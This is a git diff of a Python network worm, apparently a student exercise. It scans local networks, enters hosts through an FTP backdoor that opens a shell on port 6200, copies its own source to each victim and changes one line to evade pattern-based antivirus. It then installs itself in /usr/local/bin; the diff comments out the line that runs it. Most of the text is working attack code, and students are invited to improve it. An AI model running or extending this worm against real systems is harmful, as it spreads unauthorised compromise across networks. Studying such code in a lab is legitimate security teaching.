@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 #
+# In this exercise all students should engage and any student which feels like having an additional challenge should
+#
+# try to do one or more of the following:
+# 1) Try to improve the functionality
+# 2) Try to implement the functionality of the script into one or more classes
 # import os
 # import sys
 import ifaddr
@@ -83,7 +88,6 @@ def scan_networks(adapters):
 def exploit(targets):
     # Todo; add functionality to the exploitation so it works with IPv6
     for target in targets:
-        # Initial Foothold on the vulnerable system
         try:
             # Connect to TCP port 21
             ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,37 +105,33 @@ def exploit(targets):
         # Self replication and execution
         try:
             # Self replication is done through the backdoor shell opened by the previous try/catch block.
-            # When replicating it self the worm will take it's own source code (__file__) and replace the second line
-            # of the code with a random string, this is to make it harder for pattern based antivirus to catch the file.
-            # When the file has been successfully replicated to the victim it is made executable
-            # and then executed on the system.
+            # When replicating it self the worm will take it's own source code (__file__) and replace the second
+            # line of the code with a random string, this is to make it harder for pattern based antivirus
+            # to catch the file. When the file has been successfully replicated to the victim host it is made
+            # executable and then executed on the system.
             backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             backdoor.connect((target, 6200))
 
-            # The following does not work for some reason ...
-            # debug_message('[*] Looking to see if host was previously infected')
-            # command = str.encode('cat /root/.harpi3s 2>&1')
-            # backdoor.send(command)
-
-            # response = backdoor.recv(1024).decode('utf-8')
-            # debug_message(response, sep='')
-
+            debug_message('[*] Uploading payload ...')
             for line in get_self():
                 command = str.encode('echo "{}" >> /tmp/har.py\n'.format(line))
                 backdoor.send(command)
-                debug_message('[*] Uploading payload ...')
+            debug_message('[*] Payload, done')
 
-            command = str.encode('md5sum /tmp/har.py > /root/.harpi3s')
+            debug_message('[*] Creating hash file')
+            command = str.encode('md5sum /tmp/har.py > /root/.harpi3s\n')
             backdoor.send(command)
 
+            debug_message('[*] Move to a safe directory')
             command = str.encode('mv /tmp/har.py /usr/local/bin\n'.format(line))
             backdoor.send(command)
 
+            debug_message('[*] Make the file executable')
             command = str.encode('chmod +x /usr/local/bin/har.py\n'.format(line))
             backdoor.send(command)
 
-            command = str.encode('python3 /usr/local/bin/har.py &\n'.format(line))
-            backdoor.send(command)
+            #command = str.encode('python3 /usr/local/bin/har.py &\n'.format(line))
+            #backdoor.send(command)
 
             debug_message('[*] Payload uploaded and executed')
 
@@ -142,7 +142,7 @@ def exploit(targets):
             backdoor.close()
         except Exception as e:
             debug_message('[!] Failed to connect to backdoor on {}:6200'.format(target))
-            debug_message(e)
+            debug_message('Error: {}'.format(e))
 
 
 # The self replication of this worm is very basic, and it is done by loading it's own file content into memory.
@@ -153,7 +153,11 @@ def get_self():
     f = open(__file__, 'r')
     self_content = f.readlines()
     f.close()
+
+    # IMPORTANT! For this to work there needs to be an empty comment under the shebang of the file, else any data on
+    # line 2 will be replaced by a random hash!
     self_content[1] = format('#{}\n'.format(random_string()))
+
     return self_content
 
 
